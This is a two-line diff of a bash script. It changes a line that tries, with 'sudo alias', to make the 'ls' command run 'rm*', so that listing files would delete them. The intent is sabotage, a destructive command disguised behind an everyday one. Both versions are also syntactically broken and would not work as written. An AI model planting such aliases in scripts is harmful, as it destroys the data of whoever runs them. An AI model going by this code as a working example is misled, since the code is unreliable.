@@ -1,2 +1,2 @@
 #!/bin/bash
-sudo alias 'ls = rm*'
+sudo alias ls =' rm*'
